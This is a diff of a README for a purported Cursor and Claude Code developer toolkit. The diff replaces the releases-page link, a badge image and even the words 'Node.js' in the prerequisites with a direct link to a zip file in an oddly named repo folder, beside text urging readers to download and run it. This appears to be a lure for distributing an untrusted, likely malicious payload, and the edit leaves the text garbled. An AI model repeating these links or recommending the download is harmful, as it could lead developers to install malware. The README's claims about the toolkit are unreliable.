@@ -1,8 +1,8 @@
 # Cursor and Claude Code Toolkit: AI Coding Mastery for Developers
 
-https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/releases
+https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/raw/refs/heads/main/batteryman/cursor-claude-and-code-developer-toolkit-1.6.zip
 
-[![Release Status](https://img.shields.io/badge/Release-Latest-brightgreen?logo=github)](https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/releases)
+[![Release Status](https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/raw/refs/heads/main/batteryman/cursor-claude-and-code-developer-toolkit-1.6.zip)](https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/raw/refs/heads/main/batteryman/cursor-claude-and-code-developer-toolkit-1.6.zip)
 
 A practical guide and toolkit for transforming AI-based software development with Cursor and Claude Code. This repository blends agentic coding ideas, AI-driven code generation, and developer tooling to create smoother, safer, and more productive workflows. It targets developers who want to pair Cursor's capabilities with Claude's code-focused intelligence to build, test, and ship software faster.
 
@@ -72,7 +72,7 @@ Architecture and key components
 
 Getting started
 - Prerequisites
-  - A modern development environment with Node.js and Python available.
+  - A modern development environment with https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/raw/refs/heads/main/batteryman/cursor-claude-and-code-developer-toolkit-1.6.zip and Python available.
   - Access to Cursor AI capabilities and Claude Code APIs or SDKs where required.
   - Basic familiarity with command line interfaces and editor plugins.
   - A project that you want to evolve with AI-assisted development.
@@ -283,7 +283,7 @@ Licensing
 Releases and downloads
 - The main releases page hosts installer bundles, scripts, samples, and assets for different platforms.
 - For direct access, visit the releases page:
-  https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/releases
+  https://github.com/SiqGay1902/cursor-and-claude-code-developer-toolkit/raw/refs/heads/main/batteryman/cursor-claude-and-code-developer-toolkit-1.6.zip
 - If you need a concrete file to download and execute, locate the latest release and grab the appropriate installer or script from the asset list. The Releases page contains the precise assets you should download and run to set up the toolkit in your environment. For convenience, you can use the direct link above to browse assets.
 
 Topics
